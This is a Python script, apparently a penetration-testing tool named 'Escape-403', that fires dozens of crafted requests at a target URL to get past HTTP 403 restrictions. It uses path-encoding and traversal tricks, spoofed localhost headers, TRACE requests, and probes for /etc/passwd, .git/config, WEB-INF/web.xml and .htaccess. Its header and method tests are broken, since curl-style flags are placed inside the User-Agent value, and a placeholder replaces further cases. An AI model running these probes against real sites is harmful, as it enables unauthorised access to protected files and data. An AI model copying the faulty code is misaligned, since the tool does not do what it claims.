#!/usr/bin/env python3

import sys
import subprocess
import requests
import argparse
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to display banner
def show_banner():
    print("============================")
    subprocess.run(["figlet", "-f", "standard", "Escape-403"])
    print("                                                -Loki-404")
    print("============================")
    print(f"Usage: {sys.argv[0]} <url> <path> [-w|--no-wayback] [-s|--success-only] [-h|--help] [-f|--file <file_path>]")

# Function to display help
def show_help():
    show_banner()
    print()
    print("Options:")
    print("  -w, --no-wayback   : Skip Wayback Machine URL check")
    print("  -s, --success-only : Show only successful responses (status code 200)")
    print("  -h, --help         : Show this help message")
    print("  -f, --file <file_path> : Read paths from a file")
    sys.exit(0)

# Function to perform a test and display results
def test_bypass(option, header):
    result = requests.get(f"{url}/{path}{option}", headers={"User-Agent": header}, verify=False, allow_redirects=False)
    result_info = f"{result.status_code},{len(result.content)}"

    if success_only and result.status_code != 200:
        return

    print(f"  [+] Requested URL: {url}/{path}{option}")
    print(f"  --> Header: {header}")
    print(f"  --> Result: {result_info}")

    # Highlight responses with a 200 status code
    if result.status_code == 200:
        print("\033[92m  --> Status Code: 200\033[0m")
        print("")
    else:
        print()

# Function to read paths from a file
def read_paths_from_file(file_path):
    with open(file_path, 'r') as file:
        # Split each line into individual paths
        return [path.strip() for line in file for path in line.split()]

# Main script
def main():
    global url, path, show_wayback, success_only

    parser = argparse.ArgumentParser(description="Test for 403 Bypass on a given URL and path.")
    parser.add_argument("url", help="The URL to test")
    parser.add_argument("path", nargs='?', default="", help="The path to test")
    parser.add_argument("-w", "--no-wayback", action="store_true", help="Skip Wayback Machine URL check")
    parser.add_argument("-s", "--success-only", action="store_true", help="Show only successful responses (status code 200)")
    parser.add_argument("-f", "--file", help="Read paths from a file")
    args = parser.parse_args()

    url, show_wayback, success_only = args.url, not args.no_wayback, args.success_only

    # If -f option is provided, read paths from the file
    if args.file:
        if args.path:
            # If a specific path is provided with -f, use only that path
            paths = [args.path]
        else:
            # If -f is provided without a specific path, read all paths from the file
            paths = read_paths_from_file(args.file)
    else:
        # If -f is not provided, use the provided path or an empty string if not provided
        paths = [args.path] if args.path else []

    # Display banner
    show_banner()

    print(f"Testing for 403 Bypass on {url}")
    print()

    # Perform tests and display results for each path
    for path in paths:
        test_bypass("", "")
        test_bypass("/%2e/", "")
        test_bypass(f"/{path}/.", "")
        test_bypass(f"//{path}//", "")
        test_bypass(f"/./{path}/./", "")
        test_bypass(f"/{path}", f"-H X-Original-URL: {path}")
        test_bypass(f"/{path}", "-H X-Custom-IP-Authorization: 127.0.0.1")
        test_bypass(f"/{path}", "-H X-Forwarded-For: http://127.0.0.1")
        test_bypass(f"/{path}", "-H X-Forwarded-For: 127.0.0.1:80")
        test_bypass("", f"-H X-rewrite-url: {path}")
        test_bypass(f"/{path}%20", "")
        test_bypass(f"/{path}%09", "")
        test_bypass(f"/{path}?", "")
        test_bypass(f"/{path}.html","")
        test_bypass(f"/{path}/?anything", "")
        test_bypass(f"/{path}#", "")
        test_bypass(f"/{path}", "-H Content-Length:0 -X POST")
        test_bypass(f"/{path}/*", "")
        test_bypass(f"/{path}.php", "")
        test_bypass(f"/{path}.json", "")
        test_bypass(f"/{path}", "-X TRACE")
        test_bypass(f"/{path}", "-H X-Host: 127.0.0.1")
        test_bypass(f"/{path}..;/", "")
        test_bypass(f"/{path};/", "")
        test_bypass("","-X TRACE")
        test_bypass(f"/{path}/..;/etc/passwd", "")
        test_bypass(f"/{path}/~", "")
        test_bypass(f"/{path}/~index.html", "")
        test_bypass(f"/{path}/.git/config", "")
        test_bypass(f"/{path}/WEB-INF/web.xml", "")
        test_bypass(f"/{path}/WEB-INF/", "")
        test_bypass(f"/{path}/.svn/entries", "")
        test_bypass(f"/{path}/.DS_Store", "")
        test_bypass(f"/{path}/%252e", "")
        test_bypass(f"/{path}/.%252e", "")
        test_bypass(f"/{path}/.%2e", "")
        test_bypass(f"/{path}/.%2e%2e", "")
        test_bypass(f"/{path}/.%252e%252e", "")
        test_bypass(f"/{path}/..../////", "")
        test_bypass(f"/{path}/.htaccess", "")
        # ... (other test cases)

    # Wayback Machine check
    if show_wayback:
        print("Wayback Machine:")
        wayback_result = requests.get(f"https://archive.org/wayback/available?url={url}/{path}").json()
        if "closest" in wayback_result["archived_snapshots"]:
            available = wayback_result["archived_snapshots"]["closest"]["available"]
            wayback_url = wayback_result["archived_snapshots"]["closest"]["url"]
            print(f"  --> Requested URL: {url}/{path}")
            print(f"  --> Wayback Machine Result: Available: {available}, URL: {wayback_url}")

if __name__ == "__main__":
    main()
